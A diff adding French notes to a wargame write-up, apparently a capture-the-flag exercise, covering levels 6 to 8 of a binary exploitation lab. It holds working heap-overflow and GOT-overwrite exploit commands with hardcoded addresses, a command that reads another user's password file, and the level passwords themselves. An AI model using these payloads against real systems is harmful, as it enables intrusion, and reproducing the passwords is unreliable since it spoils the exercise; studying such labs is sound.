@@ -232,16 +232,52 @@ level5:
 
 level6:
 
+	observations:
+		Il y a deux mallocs a la suite dans la fonction, ensuite le contenue du premier malloc est ecraser par la valeur de argv[1] avec la fonction strcpy.
+		Ensuite la valeur de dereferencement du resultat du deuxiemee malloc est execute en tant que fonction.
 	
+	solution:
+		Nous cherchons le decalage dans la memoire entre les deux mallocs.
+		Ensuite nous faisons un buffer overflow de ce decalage pour ecraser la valeur laquelle est pointee par le deuxieme malloc.
+
+	commande:
+		./level6 $(python -c "print ('a' * 72 + '\x54\x84\x04\x08' + '\x00')")
+	
+	pass:
+		f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
 
+level7:
+
+	observations:
+		Il y a une fonction <m> qui affiche la chaine c.
+		Il y a quatre mallocs successif dans le main.
+		Ces allocations sont suivit de deux strcpy successif des argv1 et argv2 chacun dans leur malloc respectif.
+		Ensuite un fget ouvre le fichier '.pass' de l'utilisateur 'level8' et le stock dans la chaine c qui est global.
+		Par la suite un appel a puts est effectue.
+
+	solution:
+		Je vais overflow dans le premier strcpy pour ecraser l'addresse dans le malloc numero 2 aevc l'addresse visee par la fonction puts.
+		Ensuite je vais mettre l'addresse de la fonction <m> qui affiche la chaine c.
+
+	adresse:
+		jmp			= 0x8049928
+		m			= 0x80484f4
+		malloc:2	= 0x804a018
+		malloc:3	= 0x804a028
+
+	commande:
+		./level7 $(python -c "print('A'*(16 + 4) + '\x28\x99\x04\x08')") $(printf '\xf4\x84\x04\x08')
+
+	pass:
+		5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 
 
+level8:
 
-
-
-
-
+	bonne commande:
+		(echo $(printf "auth \xe8\x9f\x04\x08"); echo $(echo "login"); echo $(echo "cat /home/user/level9/.pass")) | ./level8
+		
 
 
 NOTES:
